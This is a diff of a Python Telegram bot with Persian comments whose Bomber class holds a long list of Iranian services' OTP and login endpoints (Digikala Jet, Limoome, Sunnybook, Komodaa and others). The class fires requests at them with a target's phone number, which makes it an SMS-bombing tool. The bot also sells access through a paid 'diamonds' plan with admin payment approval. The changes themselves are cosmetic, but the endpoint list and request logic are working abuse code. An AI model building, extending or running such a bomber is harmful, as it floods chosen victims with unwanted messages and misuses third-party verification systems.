@@ -83,7 +83,7 @@ class Bomber:
         self.fail = 0
 
     def load_services(self):
-        # ⚠️ لیست سرویس‌های خودت رو اینجا کپی کن
+        # ⚠️⚠️⚠️ لیست سرویس‌های خودت رو اینجا کپی کن ⚠️⚠️⚠️
         self.services = [
             {'name': 'Digikala Jet', 'url': 'https://api.digikalajet.ir/user/login-register/', 'method': 'POST', 'data': lambda: {"phone": self.phone_number}, 'json': True},
             {'name': 'Limoome', 'url': 'https://my.limoome.com/api/auth/login/otp', 'method': 'POST', 'data': lambda: {"mobileNumber": self.phone_number.split("+98")[1], "country": "1"}, 'json': False},
@@ -179,7 +179,7 @@ class Bomber:
             {'name': 'Sunnybook', 'url': 'https://sunnybook.ir/Home/RegisterUser', 'method': 'POST', 'data': lambda: {"name": "Mr", "password": "123456", "mobile": self.phone_number.split("+98")[1]}, 'json': True},
             {'name': 'Adinehbook', 'url': 'https://www.adinehbook.com/gp/flex/sign-in.html', 'method': 'POST', 'data': lambda: {"action": "sign", "phone_cell_or_email": "0" + self.phone_number.split("+98")[1]}, 'json': False},
             {'name': 'Komodaa', 'url': 'https://api.komodaa.com/api/v2.6/loginRC/request', 'method': 'POST', 'data': lambda: {"phone_number": "0" + self.phone_number.split("+98")[1]}, 'json': True},
-         ]
+        ]
 
     def send_request(self, service, phone):
         if self.stop_event.is_set(): return
@@ -226,7 +226,7 @@ class Bomber:
         if self.user_id in active_bombers: del active_bombers[self.user_id]
 
 # ==========================================
-# 4. کیبورد پایین صفحه (Reply) و منوی اصلی
+# 4. کیبوردها
 # ==========================================
 def get_reply_keyboard(is_admin=False):
     markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
@@ -523,7 +523,7 @@ def kb_admin(message):
 def handle_callbacks(call):
     user_id = str(call.from_user.id)
     user = get_user(user_id)
-
+    
     if call.data == "menu_back":
         caption = "منوی اصلی:"
         try:
@@ -669,20 +669,3 @@ def handle_callbacks(call):
                 bot.send_message(uid, f"💎 **پرداخت تایید شد!**\n**{plan['diamonds']}** الماس به حساب شما اضافه شد.", parse_mode='Markdown')
             bot.edit_message_text(f"✅ تایید شد.", call.message.chat.id, call.message.message_id)
             del pending_approvals[req_id]
-
-    elif call.data.startswith("admin_reject_"):
-        req_id = call.data.replace("admin_reject_", "")
-        if req_id in pending_approvals:
-            uid = pending_approvals[req_id]["user_id"]
-            bot.edit_message_text("❌ رد شد.", call.message.chat.id, call.message.message_id)
-            bot.send_message(uid, "❌ رسید شما رد شد.")
-            del pending_approvals[req_id]
-
-# ==========================================
-# 9. توابع کمکی و دریافت ورودی‌ها
-# ==========================================
-def send_broadcast(message):
-    conn = sqlite3.connect(DB_FILE)
-    c = conn.cursor()
-    c.execute("SELECT user_id FROM users")
-    users = c.fetchall()
